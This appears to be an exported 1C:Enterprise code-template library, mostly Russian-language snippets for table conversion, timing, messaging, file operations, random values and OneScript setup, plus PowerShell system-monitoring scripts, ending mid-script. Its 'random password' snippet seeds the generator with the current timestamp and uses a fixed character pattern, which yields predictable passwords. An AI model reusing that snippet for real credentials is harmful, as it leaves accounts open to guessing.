{"ТД в ТЗ 3 (построчно)",0,0,"","Функция ТабличныйДокументВТаблицуЗначений(ТабДок)
	
	ТаблицаДанныеДокумента = Новый ТаблицаЗначений();
	
	Для СчетчикКолонок = 1 По ТабДок.ШиринаТаблицы Цикл
		
		ИмяКолонки = ""_"" + СчетчикКолонок;
		ТаблицаДанныеДокумента.Колонки.Добавить(ИмяКолонки);
		
		Для СчетчикСтрок = 1 По ТабДок.ВысотаТаблицы Цикл
			
			ИндексСтроки = СчетчикСтрок - 1;
			
			Если СчетчикКолонок = 1 Тогда
				СтрокаТаблицы = ТаблицаДанныеДокумента.Добавить();
			Иначе
				СтрокаТаблицы = ТаблицаДанныеДокумента[ИндексСтроки];
			КонецЕсли;
			
			ТекущаяЯчейка = ТабДок.Область(СчетчикСтрок, СчетчикКолонок);
			ЗначениеЯчейки = ТекущаяЯчейка.Текст;
			
			СтрокаТаблицы[ИмяКолонки] = ЗначениеЯчейки;
			
		КонецЦикла
	КонецЦикла;
	Возврат ТаблицаДанныеДокумента;
	
КонецФункции
| Подробнее: http://www.advanter.net/preobrazovanie-tablichnogo-dokumenta-v-tablicu-znachenij-perebor/"}
},
{0,
{"ТД в ТЗ (через ПостроительОтчета)",0,0,"","&НаСервере
Функция ПреобразоватьТабличныйДокументВТаблицуЗначений(ТабДокумент)
	
	ПоследняяСтрока 	= ТабДокумент.ВысотаТаблицы;
	ПоследняяКолонка 	= ТабДокумент.ШиринаТаблицы;
	ОбластьЯчеек 		= ТабДокумент.Область(1, 1, ПоследняяСтрока, ПоследняяКолонка); 
	// Создаем описание источника данных на основании области ячеек табличного документа.
	ИсточникДанных 		= Новый ОписаниеИсточникаДанных(ОбластьЯчеек);  
	// Создаем объект для интеллектуального построения отчетов,
	// указываем источник данных и выполняем построение отчета.
	ПостроительОтчета 	= Новый ПостроительОтчета; 
	ПостроительОтчета.ИсточникДанных 	= ИсточникДанных;
	ПостроительОтчета.Выполнить();
	// Результат выгружаем в таблицу значений.
	ТабЗначений 		= ПостроительОтчета.Результат.Выгрузить();
	
	Возврат ТабЗначений;
	
КонецФункции"}
},
{0,
{"Область ТД в ТЗ  (через ПостроительОтчета)",0,0,"","//Создать Таблицу значений из области Табличного документа

//Из макета будет выгружена область с именем ""ОбластьДанных"". По умолчанию первая строка области будет названием колонок ТЗ.
//Отмечу, что источником в построителе запроса является не Табличный документ, а Область Табличного документа.

Функция ПолучитьТЗИзМакета(ИмяМакета)
	МакетСправочника 	= ПолучитьМакет(ИмяМакета);
	ОбластьДанныхМакета = МакетСправочника.ПолучитьОбласть(""ОбластьДанных"");
	ТЗ 	= ПолучитьТаблицуИзОбластиМакета(ОбластьДанныхМакета.Область(1,1, ОбластьДанныхМакета.ВысотаТаблицы, ОбластьДанныхМакета.ШиринаТаблицы));
КонецФункции
//////////////////////////////////////////////////
Функция ПолучитьТаблицуИзОбластиМакета(ОбластьМакета)
	Построитель 	= Новый ПостроительЗапроса;
	ИсточникДанных 	= Новый ОписаниеИсточникаДанных(ОбластьМакета);
	Построитель.ИсточникДанных 	= ИсточникДанных;
	Построитель.Выполнить();
	ТабЗначений 	= Построитель.Результат.Выгрузить();
	Возврат ТабЗначений;
КонецФункции"}
}
}
},
{3,
{"Производительность (ЗамерВремени)",1,0,"",""},
{0,
{"ОценкаПроизводительностиКлиентСервер (устарело)",0,0,"","// Устарела. Будет удалена в следующей редакции библиотеки.
// Необходимо использовать
//		на сервере - ОценкаПроизводительности.НачатьЗамерВремени.
//		на клиенте - ОценкаПроизводительностиКлиент.НачатьЗамерВремени.
ОценкаПроизводительностиКлиентСервер.НачатьЗамерВремени(КлючеваяОперация);"}
},
{0,
{"ОценкаПроизводительности.НачатьЗамерВремени (Сервер)",0,0,"НЗВС","лЗамерВремениНачало 	= ОценкаПроизводительности.НачатьЗамерВремени(); //Начало типового замера времени на Сервере



ОценкаПроизводительности.ЗакончитьЗамерВремени(""<?""Ключевая операция (вроде слитно или с заглавными первыми буквами слов)"">"", лЗамерВремениНачало, , """"); //Конец типового замера времени на Сервере"}
},
{0,
{"ОценкаПроизводительностиКлиент.НачатьЗамерВремени (Клиент)",0,0,"НЗВК","ОценкаПроизводительностиКлиент.НачатьЗамерВремени(Истина, ""<?""Ключевая операция (вроде слитно или с заглавными первыми буквами слов)"">"");"}
}
},
{1,
{"Система взаимодействия (типовое)",1,0,"",""},
{0,
{"ОтправитьСообщениеАссистенту",0,0,"","// Процедура ОтправитьСообщениеАссистенту
//
// Параметры:
//  Ссылка	 		 - Ссылка 					- Ссылка на тот объект, в обсуждения которого нужно отправить сообщение 
//  Заголовок		 - Строка 					- Заголовок обсуждения 					
//  Текст			 - Строка 					- Текст сообщения
//  Получатель 		 - Справочник.Пользователи  - пользователь, которому нужно отправить сообщение
// 
//автор: Тюрин Н.А. 17.05.2019
Процедура ОтправитьСообщениеАссистенту(Ссылка, Заголовок, Текст, Получатель) Экспорт
	
	НавСсылка = ПолучитьНавигационнуюСсылку(Ссылка);
	
	УстановитьПривилегированныйРежим(Истина);
	
	ОтборОбсуждений = Новый ОтборОбсужденийСистемыВзаимодействия();
	ОтборОбсуждений.КонтекстноеОбсуждение = Истина;
	
	КонтекстОбсуждения = Новый КонтекстОбсужденияСистемыВзаимодействия(НавСсылка);
	ОтборОбсуждений.КонтекстОбсуждения = КонтекстОбсуждения;
	
	Обсуждения = СистемаВзаимодействия.ПолучитьОбсуждения(ОтборОбсуждений);
	
	Если Обсуждения.Количество() = 0 Тогда
		НовоеОбсуждение = СистемаВзаимодействия.СоздатьОбсуждение();
		НовоеОбсуждение.Заголовок = Заголовок;
		НовоеОбсуждение.КонтекстОбсуждения = КонтекстОбсуждения;
		НовоеОбсуждение.Записать();
		
		Идентификатор = НовоеОбсуждение.Идентификатор;
	Иначе
		Идентификатор = Обсуждения[0].Идентификатор;		
	КонецЕсли;
	
	Если Идентификатор <> Неопределено Тогда
		
		НовоеСообщение = СистемаВзаимодействия.СоздатьСообщение(Идентификатор);
		ПользовательИБ = ПользователиИнформационнойБазы.НайтиПоУникальномуИдентификатору(Получатель.ИдентификаторПользователяИБ);
		ПользовательСВ = СистемаВзаимодействия.ПолучитьИдентификаторПользователя(ПользовательИБ.УникальныйИдентификатор);
		Дуся = СистемаВзаимодействия.ПолучитьИдентификаторПользователя(Новый УникальныйИдентификатор(""9de7fcc9-9c1c-4bb1-9727-0e4ef1746469""));
		
		НовоеСообщение.Автор = Дуся;
		ПользователиИнформационнойБазы.ПолучитьПользователей();
		НовоеСообщение.Получатели.Добавить(ПользовательСВ);
		НовоеСообщение.Дата = ТекущаяДата();
		НовоеСообщение.Данные = НавСсылка;
		НовоеСообщение.Текст = Текст;
		НовоеСообщение.Записать();
	КонецЕсли;
		
	УстановитьПривилегированныйРежим(Ложь);
	
КонецПроцедуры"}
}
},
{1,
{"БСП",1,0,"",""},
{0,
{"Файлы",0,0,"","Простой запуск программ

ФайловаяСистема.ЗапуститьПрограмму(""calc"");

Сбор команды запуска и получение потока вывода stdout

ПараметрыЗапускаПрограммы = ФайловаяСистема.ПараметрыЗапускаПрограммы();
ПараметрыЗапускаПрограммы.ДождатьсяЗавершения = Истина;
ПараметрыЗапускаПрограммы.ПолучитьПотокВывода = Истина;

КомандаЗапуска = Новый Массив;
КомандаЗапуска.Добавить(""ping"");
КомандаЗапуска.Добавить(""127.0.0.1"");
КомандаЗапуска.Добавить(""-n"");
КомандаЗапуска.Добавить(5);

Результат = ФайловаяСистема.ЗапуститьПрограмму(КомандаЗапуска, ПараметрыЗапускаПрограммы);

ОбщегоНазначений.СообщитьПользователю(Результат.ПотокВывода);

Поместить выбранный на клиенте файл во временное хранилище

Оповещение = Новый ОписаниеОповещения(""ПослеЗагрузкиФайла"", ЭтотОбъект);
ПараметрыЗагрузки = ФайловаяСистемаКлиент.ПараметрыЗагрузкиФайла();
ПараметрыЗагрузки.ИдентификаторФормы = УникальныйИдентификатор;
ФайловаяСистемаКлиент.ЗагрузитьФайл(Оповещение, ПараметрыЗагрузки);

Сохранить файл на клиенте из временного хранилища

Оповещение = Новый ОписаниеОповещения(""ПослеСохраненияФайла"", ЭтотОбъект);
ФайловаяСистемаКлиент.СохранитьФайл(Оповещение, АдресВоВременномХранилище, ""МойФайл.файл"");

Открывает файл для просмотра или редактирования c диска клиента

ФайловаяСистемаКлиент.ОткрытьФайл(КаталогДокументов + ""МойФайл.файл"")

Открывает файл для просмотра или редактирования c временного хранилища

ФайловаяСистемаКлиент.ОткрытьФайл(АдресВоВременномХранилище, , ""МойФайл.файл"");

Открывает проводник c позиционирование курсора на файле.

ФайловаяСистемаКлиент.ОткрытьПроводник(""C:\Program Files\1cv8\common\1cestart.exe"")
ФайловаяСистемаКлиент.ОткрытьПроводник(""/home/"")

Открывает навигационную ссылку в программе, которая ассоциирована с протоколом навигационной ссылки.

ФайловаяСистемаКлиент.ОткрытьНавигационнуюСсылку(""e1cib/navigationpoint/startpage""); // начальная страница.
ФайловаяСистемаКлиент.ОткрытьНавигационнуюСсылку(""v8help://1cv8/QueryLanguageFullTextSearchInData"");
ФайловаяСистемаКлиент.ОткрытьНавигационнуюСсылку(""https://1c.ru"");
ФайловаяСистемаКлиент.ОткрытьНавигационнуюСсылку(""mailto:help@1c.ru"");
ФайловаяСистемаКлиент.ОткрытьНавигационнуюСсылку(""skype:echo123?call"");

Показывает диалог выбора каталога.

Оповещение = Новый ОписаниеОповещения(""ПослеВыбораКаталога"", ЭтотОбъект);
ФайловаяСистемаКлиент.ВыбратьКаталог(Оповещение);

Ну и немножко о внешних компонентах

Оповещение = Новый ОписаниеОповещения(""ПослеПодключенияКомпоненты"", ЭтотОбъект)
ОбщегоНазначенияКлиент.ПодключитьКомпонентуИзМакета(Оповещение, ""CryptS"", ""Обработка.ЗаявлениеНаВыпускНовогоКвалифицированногоСертификата.Макет.КомпонентаОбмена"");"}
}
},
{4,
{"Случайности (ГСЧ,  временные файлы-каталоги)",1,0,"",""},
{8,
{"ГСЧ",1,0,"",""},
{0,
{"ГСЧ",0,0,"ГСЧ","лГСЧ 				= Новый ГенераторСлучайныхЧисел();
лСлучайноеЧисло 	= лГСЧ.СлучайноеЧисло(0, 1);"}
},
{0,
{"Случайная строка",0,0,"","Функция ПолучитьСлучайнуюСтроку(пГСЧ = Неопределено, лКолСимволов = 1)
	
	Если пГСЧ = Неопределено Тогда
		лГСЧ 	= Новый ГенераторСлучайныхЧисел();
	Иначе
		лГСЧ 	= пГСЧ;
	КонецЕсли; 
	
	лСлучайнаяСтрока = """";
	Для Сч = 1 По лКолСимволов Цикл
		
		лСлучЧисло = лГСЧ.СлучайноеЧисло(0, 2) ;
		
		Если лСлучЧисло = 0 Тогда
			лСлучайнаяСтрока 	= лСлучайнаяСтрока + Символ(лГСЧ.СлучайноеЧисло(32, 126)); // Символ 32 - пробел, цифры, знаки, англ буквы
		ИначеЕсли лСлучЧисло = 1 Тогда
			лСлучайнаяСтрока 	= лСлучайнаяСтрока + Символ(лГСЧ.СлучайноеЧисло(1073, 1103)); // строчная кириллица
		Иначе
			лСлучайнаяСтрока 	= лСлучайнаяСтрока + Символ(лГСЧ.СлучайноеЧисло(1040, 1072)); // прописная кириллица
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат лСлучайнаяСтрока;
	
КонецФункции // ПолучитьСлучайнуюСтроку()"}
},
{0,
{"Случайная строка по шаблону",0,0,"","лГСЧ 	= Новый ГенераторСлучайныхЧисел(); 
лШаблон = ""фыв"";

RegExp 				= Новый COMОбъект(""VBScript.RegExp""); //Для 1C v 7.x: CreateObject(""VBScript.RegExp"") 
RegExp.IgnoreCase 	= Истина; //Игнорировать регистр 
RegExp.Global 		= Истина; //Поиск всех вхождений шаблона 
RegExp.MultiLine 	= Истина; //Многострочный режим 
RegExp.Pattern 		= лШаблон;

лСлучайнаяСтрока 	= """";
лЦиклов 			= 0;
Пока НЕ RegExp.Test(лСлучайнаяСтрока) И лЦиклов < 100000 Цикл
	
	лСлучайнаяСтрока 	= """";
	
	Для Сч = 1 По 10 Цикл
		
		лСлучЧисло 	= лГСЧ.СлучайноеЧисло(0, 2) ;
		
		Если лСлучЧисло = 0 Тогда
			лСлучайнаяСтрока 	= лСлучайнаяСтрока + Символ(лГСЧ.СлучайноеЧисло(33, 126)); // цифры, знаки, англ буквы
		ИначеЕсли лСлучЧисло = 1 Тогда
			лСлучайнаяСтрока 	= лСлучайнаяСтрока + Символ(лГСЧ.СлучайноеЧисло(1073, 1103)); // строчная кириллица
		Иначе
			лСлучайнаяСтрока 	= лСлучайнаяСтрока + Символ(лГСЧ.СлучайноеЧисло(1040, 1072)); // прописная кириллица
		КонецЕсли;
		
	КонецЦикла;
	
	лЦиклов 	= лЦиклов + 1;
	
КонецЦикла; 

Сообщить(лСлучайнаяСтрока);"}
},
{0,
{"Случайный пароль",0,0,"","Пароль = """";
ГСЧ = Новый ГенераторСлучайныхЧисел(Число(Формат(ТекущаяДата(), ""ДФ=yyyyMMddHHmmss"")));
МинимальнаяДлинаПаролейПользователей = ПолучитьМинимальнуюДлинуПаролейПользователей();
Если МинимальнаяДлинаПаролейПользователей = 0 Тогда
	МинимальнаяДлинаПаролейПользователей = 7;
КонецЕсли;    
Сч = 0;
Пока СтрДлина(Пароль) < МинимальнаяДлинаПаролейПользователей Цикл        
	Сч = Сч + 1;
	Если Сч <= 5 Тогда
		Пароль = Пароль + Символ(ГСЧ.СлучайноеЧисло(48, 57)); // цифры
	ИначеЕсли Сч = 6 Тогда
		Пароль = Пароль + Символ(ГСЧ.СлучайноеЧисло(1073, 1103)); // строчная кириллица
	ИначеЕсли Сч = 7 Тогда
		Пароль = Пароль + Символ(ГСЧ.СлучайноеЧисло(1040, 1072)); // прописная кириллица
	КонецЕсли;            
КонецЦикла;
"}
},
{0,
{"Варианты применения",0,0,"","Известный афоризм математика ORNL Роберта Кавью: «генерация случайных чисел слишком важна, чтобы оставлять её на волю случая».

Заполнение набора тестовых данных 
Генерация ШК 
Генерация коротких уникальных УИ 
Выборочный контроль сотрудников 
Расчет риска методом Монте-Карло 
Определение интервалов обращения к сервисам 
Одноразовые пароли 
Выбор аттестационных вопросов 
Азартные игры 
Эмуляция отчетности 
Розыгрыши 
Ключи шифрования 
Формирование недостающих документов 
Моделирование деятельности 
Генерация паролей 
Распределение накладных по водителям 
Моделирование отчетности 
Выбор исполнителя 
Выбор анекдота 
Диверсификация текстов 
Выбор клиентов для акций 
Выбор товаров для акций 
Розыгрыш премий 
Выбор товаров для стимулирования продаж 
Имитация ошибок и искажений информации 
Магический шар 
Криптография 
"}
},
{0,
{"ГСЧ без дубликатов",0,0,"","Массив 	= Новый Массив();
Для н = 1 по 20 Цикл
	
	Найден = Истина;
	Пока Найден Цикл
		ГСЧ 	= Новый ГенераторСлучайныхЧисел(ТекущаяУниверсальнаяДатаВМиллисекундах());
		Код 	= """";
		
		Для у = 1 по 10 Цикл
			
			Число 	= ГСЧ.СлучайноеЧисло(0, 9);
			Код 	= Код + Формат(Число,""ЧЦ=1; ЧН=0; ЧВН=; ЧГ=0"");
			
		КонецЦикла;
		
		Результат 	= Массив.Найти(Код);
		Если Результат = Неопределено Тогда
			Найден 	= Ложь;
			Массив.Добавить(Код);
		КонецЕсли; 
		
	КонецЦикла;
	
	Сообщить(Код);
	
КонецЦикла;    "}
},
{0,
{"Выбрать случайный элемент ТЧ",0,0,"ГСЧТ[абл]","лГСЧ 				= Новый ГенераторСлучайныхЧисел(); 
лСлучайноеЧисло 	= лГСЧ.СлучайноеЧисло(0, <?""Имя таблицы (слитно)"">.Количество() - 1); 

л<?""Имя таблицы (слитно)"">СлучЭлем 			= <?""Имя таблицы (слитно)"">[лСлучайноеЧисло].Наименование;"}
},
{0,
{"Выбрать случайный элемент массива",0,0,"ГСЧМ[асс]","лГСЧ 				= Новый ГенераторСлучайныхЧисел(); 
лСлучайноеЧисло 	= лГСЧ.СлучайноеЧисло(0, <?""Имя массива (слитно)"">.ВГраница()); 

л<?""Имя массива (слитно)"">СлучЭлем 			= <?""Имя массива (слитно)"">[лСлучайноеЧисло];"}
}
},
{0,
{"ПолучитьИмяВременногоФайла",0,0,"ПИВФ","ПолучитьИмяВременногоФайла"}
},
{0,
{"Случайное имя",0,0,"СлучИмя","лСлучИмя 	= СтрЗаменить(Строка(Новый УникальныйИдентификатор()), ""-"", """");"}
},
{0,
{"Случайное имя файла",0,0,"","лКаталогДляВыгрузкиФайла 	= ""C:\"";
лСлучИмя 	= СтрЗаменить(Строка(Новый УникальныйИдентификатор()), ""-"", """"); 	
лИмяФайла 	= лКаталогДляВыгрузкиФайла + лСлучИмя + "".txt"";

Попытка
	УдалитьФайлы(лИмяФайла);
Исключение
	ОбщегоНазначенияКлиентСервер.СообщитьПользователю(ОписаниеОшибки());
КонецПопытки;"}
}
},
{2,
{"Описание типов",1,0,"",""},
{0,
{"ОписаниеТипов",0,0,"НОТ[ип]","Новый ОписаниеТипов(""СправочникСсылка"")"}
},
{0,
{"ОписаниеТипов Строка",0,0,"ОТСтр","Строка<?""Количество символов""> 	= Новый ОписаниеТипов(""Строка"", , Новый КвалификаторыСтроки(<?""Количество символов"">));"}
}
},
{5,
{"Доработки, правки (TODO, FIXME)",1,0,"",""},
{0,
{"Инфо (""Visual Studio Code"" и ""Todo Tree"")",0,0,"","Установить редактор ""Visual Studio Code"" и в нём поставить расширение ""Todo Tree"" - оно будет показывать текст по тегам TODO и FIXME."}
},
{0,
{"Доработки, TODO",0,0,"/тд","//TODO [АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">]: <?>"}
},
{0,
{"Доработки, TODO (русский ввод)",0,0,"/дор[абот]","//TODO [АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">]: <?>"}
},
{0,
{"Правки, FIXME",0,0,"/фм","//FIXME [АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">]: <?>"}
},
{0,
{"Правки, FIXME (русский ввод)",0,0,"/прав[к]","//FIXME [АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">]: <?>"}
}
},
{3,
{"OneScript (код 1С) через Visual Code Studio",1,0,"",""},
{0,
{"Файл отладки launch.json (должен лежать рядом с запускаемыми файлами *.os)",0,0,"","{
    // Используйте IntelliSense, чтобы узнать о возможных атрибутах.
    // Наведите указатель мыши, чтобы просмотреть описания существующих атрибутов.
    // Для получения дополнительной информации посетите: https://go.microsoft.com/fwlink/?linkid=830387
    ""version"": ""0.2.0"",
    ""configurations"": [
        {
            ""name"": ""Отладка 1Script"",
            ""type"": ""oscript"",
            ""request"": ""launch"",
            ""program"": ""${file}"",
            ""args"": [],
            ""cwd"": ""${workspaceRoot}"",
            ""runtimeExecutable"": null,
            ""debugPort"": 2801,
            ""protocol"": ""internal""
        }
    ]
}"}
},
{0,
{"Аргументы в launch.json (пример)",0,0,"","Аргумент может быть таким:
""args"": [
	""${file}"",
	""Аргумент1"",
	""Аргумент2""
],
"}
},
{0,
{"Расширения (Language 1C (BSL), OneScript)",0,0,"","//https://github.com/1c-syntax/vsc-language-1c-bsl/wiki/%D0%97%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%BE%D0%B2-.os-.bsl-%D1%81-%D0%BF%D0%BE%D0%BC%D0%BE%D1%89%D1%8C%D1%8E-OneScript
Language 1C (BSL) 	- Поддержка языка 1С:Предприятие 8 (BSL) в VSC

//https://marketplace.visualstudio.com/items?itemName=EvilBeaver.oscript-debug
OneScript Debug 	- Сервер отладки 1Script"}
}
},
{10,
{"PowerShell",1,0,"",""},
{0,
{"Работа с JSON-объектами в Powershell",0,0,"","Работа с JSON-объектами в Powershell
Википедия определяет JSON как

текстовый формат обмена данными, основанный на JavaScript… формат считается языконезависимым и может использоваться практически с любым языком программирования.

Если говорить более конкретно, то JSON позволяет описывать объекты, на подобие того как это делает xml, но намного проще.

По сути JSON-объекты представляют собой хеш-таблицу, допускающую вложенность.


Возьмём пример всё из той же Википедии:

Следующий пример показывает JSON-представление объекта, описывающего человека. В объекте есть строковые поля имени и фамилии, объект, описывающий адрес, и массив, содержащий список телефонов.

{
   ""firstName"": ""Иван"",
   ""lastName"": ""Иванов"",
   ""address"": {
       ""streetAddress"": ""Московское ш., 101, кв.101"",
       ""city"": ""Ленинград"",
       ""postalCode"": 101101
   },
   ""phoneNumbers"": [
       ""812 123-1234"",
       ""916 123-4567""
   ]
}
Для работы с JSON-объектами в Powershell начиная с версии 3.0 предусмотрены специальные командлеты:

PS C:\> Get-Command '*json'

CommandType    Name                              ModuleName
-----------    ----                              ----------
Cmdlet         ConvertFrom-Json                  Microsoft.PowerShell.Utility
Cmdlet         ConvertTo-Json                    Microsoft.PowerShell.Utility
Для создания JSON-объекта его описание в определённом формате нужно поместить в here-string (многострочную текстовую переменную). Звучит страшно, но самом деле всё просто: берём описание нашего объекта выше, помещаем его между символами @” и “@ (это и есть here-string) и скармливаем всё это командлету ConvertFrom-Json, который конвертирует JSON-отформатированные строки в объект:

$User = @""
{
   ""firstName"": ""Иван"",
   ""lastName"": ""Иванов"",
   ""address"": {
       ""streetAddress"": ""Московское ш., 101, кв.101"",
       ""city"": ""Ленинград"",
       ""postalCode"": 101101
   },
   ""phoneNumbers"": [
       ""812 123-1234"",
       ""916 123-4567""
   ]
}
""@ | ConvertFrom-Json
Вот и всё! Объект создан. Теперь можно обращаться к отдельным свойствам объекта любой вложенности:

PS C:\> $User.firstName
Иван
PS C:\> $User.address.city
Ленинград
PS C:\> $User.phoneNumbers[0]
812 123-1234
При помощи JSON-формата очень удобно сохранять в одном объекте информацию, полученную с разных объектов и разных типов. Рассмотрим ещё один пример:

$json = @""
{
  ""ServerName""        : ""$env:ComputerName"",
  ""UserName""          : ""$env:UserName"",
  ""ComputerInfo""      :
  {
    ""Manufacturer"": ""$((Get-WmiObject Win32_ComputerSystem).Manufacturer)"",
    ""Architecture"": ""$((Get-wmiObject Win32_OperatingSystem).OSArchitecture)"",
    ""SerialNumber"": ""$((Get-wmiObject Win32_OperatingSystem).SerialNumber)""
  },
  ""CollectionDate""    : ""$(Get-Date)""
 }
""@

$Info = ConvertFrom-Json -InputObject $json

Из созданного объекта достаём, интересующие свойства:

PS C:\> $Info.ServerName
SERVER
PS C:\> $Info.UserName
admin
PS C:\> $Info.ComputerInfo.Manufacturer
System manufacturer
PS C:\> $Info.CollectionDate
07/02/2014 15:05:00
PS C:\> $Info.ComputerInfo.Architecture
64-bit

 

Если же необходимо из готового объекта сделать JSON-форматированную строку следует использовать командлет ConvertTo-Json. Например:

$File = Get-ChildItem C:\Windows\System32\calc.exe
$File.VersionInfo | ConvertTo-Json
В результате получаем:

{
    ""Comments"":  """",
    ""CompanyName"":  ""Microsoft Corporation"",
    ""FileBuildPart"":  7600,
    ""FileDescription"":  ""Калькулятор Windows"",
    ""FileMajorPart"":  6,
    ""FileMinorPart"":  1,
    ""FileName"":  ""C:\\Windows\\System32\\calc.exe"",
    ""FilePrivatePart"":  16385,
    ""FileVersion"":  ""6.1.7600.16385 (win7_rtm.090713-1255)"",
    ""InternalName"":  ""CALC"",
    ""IsDebug"":  false,
    ""IsPatched"":  false,
    ""IsPrivateBuild"":  false,
    ""IsPreRelease"":  false,
    ""IsSpecialBuild"":  false,
    ""Language"":  ""Русский (Россия)"",
    ""LegalCopyright"":  ""© Корпорация Майкрософт. Все права защищены."",
    ""LegalTrademarks"":  """",
    ""OriginalFilename"":  ""CALC.EXE.MUI"",
    ""PrivateBuild"":  """",
    ""ProductBuildPart"":  7600,
    ""ProductMajorPart"":  6,
    ""ProductMinorPart"":  1,
    ""ProductName"":  ""Операционная система Microsoft® Windows®"",
    ""ProductPrivatePart"":  16385,
    ""ProductVersion"":  ""6.1.7600.16385"",
    ""SpecialBuild"":  """"
}

После создания JSON-строки, её можно легко отправить другому приложению. Наиболее частое  использование JSON – пересылка данных от сервера к браузеру. Обычно данные доставляются с помощью AJAX, который позволяет обмениваться данными между браузером и сервером без перезагрузки страницы.

JSON прост для понимания и использования, является очень гибким инструментом для передачи данных между приложениями (или даже компьютерами), а также подходит для сохранения и вывода различной информации."}
},
{0,
{"Получить производительность компьютера",0,0,"","$CpuLogFile = 'C:\Log\ProduceLog\ProduceLog_' + (Get-Date -Format ""yyyy-MM-dd"") + '.txt'
$computer 	= ""LocalHost""
$namespace 	= ""root\CIMV2""
$Line = '**********'
$Line2 = '__________'
while (1) {
	$DateTime = (Get-Date -Format ""dd.MM.yyyy HH:mm:ss"")
    $DateTime >> $CpuLogFile
    $DateTime
	
    $CpuLoadAverage = (Get-WmiObject win32_processor | Measure-Object -property LoadPercentage -Average | Select Average ).Average
    
    $ProcessorStats = Get-WmiObject win32_processor
    $ComputerCpu = $ProcessorStats.LoadPercentage
	$ComputerCpu = ""{0:N2}"" -f $ComputerCpu
    # Lets create a re-usable WMI method for memory stats
    $OperatingSystem = Get-WmiObject win32_OperatingSystem
    # Lets grab the free memory
    $FreeMemory = $OperatingSystem.FreePhysicalMemory
    # Lets grab the total memory
    $TotalMemory = $OperatingSystem.TotalVisibleMemorySize
    # Lets do some math for percent
    $MemoryUsed = ($FreeMemory/ $TotalMemory) * 100
    $PercentMemoryUsed = ""{0:N2}"" -f $MemoryUsed

    # usedDiskSpaceDrives
    $usedDiskSpaceDrives = ''
	$driveLetters = Get-WmiObject Win32_Volume | select DriveLetter
    foreach ($driveLetter in $driveLetters)
    {
        $drive = Get-WmiObject Win32_Volume | where {$_.DriveLetter -eq $driveLetter.DriveLetter}
        
		if (-Not $drive.Capacity -eq 0)
		{
			$usedDiskSpace = $drive.Capacity - $drive.FreeSpace
			$usedDiskSpacePct = [math]::Round(($usedDiskSpace / $drive.Capacity) * 100,1)
			$usedDiskSpacePct = ""{0:N2}"" -f $usedDiskSpacePct
			$usedDiskSpaceDrives = $usedDiskSpaceDrives + $drive.Caption + '=' + $usedDiskSpacePct + '#'
		}
    }

    # Lets throw them into an object for outputting
    $objHostInfo = New-Object System.Object
    $objHostInfo | Add-Member -MemberType NoteProperty -Name Name -Value $computer
    $objHostInfo | Add-Member -MemberType NoteProperty -Name CPULoadPercent -Value $ComputerCpu
    $objHostInfo | Add-Member -MemberType NoteProperty -Name CpuLoadAverage -Value $CpuLoadAverage
    $objHostInfo | Add-Member -MemberType NoteProperty -Name MemoryUsedPercent -Value $PercentMemoryUsed
    $objHostInfo | Add-Member -MemberType NoteProperty -Name usedDiskSpaceDrives -Value $usedDiskSpaceDrives

    $objHostInfoStr = 'ComputerCpu=' + $ComputerCpu + ';CpuLoadAverage=' + $CpuLoadAverage + ';PercentMemoryUsed=' + $PercentMemoryUsed + ';usedDiskSpaceDrives={' + $usedDiskSpaceDrives + '}'
    $objHostInfoStr >> $CpuLogFile
	$objHostInfoStr
    # Lets dump our info into an array
    #$objHostInfo >> $CpuLogFile

    #'CPU LoadPercentage Average    ' + $CpuLoad >> $CpuLogFile
	$Process = Get-Process | Sort-Object CPU -desc | Select-Object -first 5
	$Process
	$Process >> $CpuLogFile
	
	$Line2 >> $CpuLogFile
	$Line2
	
	$TopMemoryUsage = get-wmiobject WIN32_PROCESS | Sort-Object -Property ws -Descending|select -first 10|Select processname, @{Name=""Mem Usage(MB)"";Expression={[math]::round($_.ws / 1mb)}},@{Name=""ProcessID"";Expression={[String]$_.ProcessID}},@{Name=""UserID"";Expression={$_.getowner().user}} | Format-Table
	$TopMemoryUsage
	$TopMemoryUsage >> $CpuLogFile
	
	$Line2 >> $CpuLogFile
	$Line2
	
	$Tcpip_NI 	= Get-WmiObject -class Win32_PerfRawData_Tcpip_NetworkInterface -computername $computer -namespace $namespace | Select BytesReceivedPersec,BytesSentPersec,BytesTotalPersec | Format-Table
	$Tcpip_NI 
	$Tcpip_NI >> $CpuLogFile

	$Line >> $CpuLogFile
	$Line
	
	sleep 10
}
"}
},
{0,
{"Список самых: загрузка памяти компьютера (Top Memory Usage using)",0,0,"","Get Top Memory Usage using Powershell

$scripthost = Read-Host ""Enter the Hostname of the Computer you would like to check Memory Statistics for""
""""
""""
""===========CPU - Top 10 Utilization List===========""
gwmi -computername $scripthost Win32_PerfFormattedData_PerfProc_Process| sort PercentProcessorTime -desc | select Name,PercentProcessorTime | Select -First 10 | ft -auto
""===========Memory - Top 10 Utilization List===========""
gwmi -computername $scripthost Win32_Process | Sort WorkingSetSize -Descending | Select Name,CommandLine,@{n=""Private Memory(mb)"";Expression = {[math]::round(($_.WorkingSetSize / 1mb), 2)}} | Select -First 10 | Out-String   
#gwmi -computername $scripthost Win32_Process | Sort WorkingSetSize -Descending | Select Name,CommandLine,@{n=""Private Memory(mb)"";e={$_.WorkingSetSize/1mb}} | Select -First 10 | Out-String
#$fields = ""Name"",@{label = ""Memory (MB)""; Expression = {[math]::round(($_.ws / 1mb), 2)}; Align = ""Right""}; 

""===========Server Memory Information===========""
$fieldPercentage = @{Name = ""Memory Percentage in Use (%)""; Expression = { “{0:N2}” -f ((($_.TotalVisibleMemorySize - $_.FreePhysicalMemory)*100)/ $_.TotalVisibleMemorySize)}};     
$fieldfreeram = @{label = ""Available Physical Memory (MB)""; Expression = {[math]::round(($_.FreePhysicalMemory / 1kb), 2)}}; 
$fieldtotalram = @{label = ""Total Physical Memory (MB)""; Expression = {[math]::round(($_.TotalVisibleMemorySize / 1kb), 2)}}; 
$fieldfreeVram = @{label = ""Available Virtual Memory (MB)""; Expression = {[math]::round(($_.FreeVirtualMemory / 1kb), 2)}}; 
$fieldtotalVram = @{label = ""Total Virtual Memory (MB)""; Expression = {[math]::round(($_.TotalVirtualMemorySize /1kb), 2)}}; 
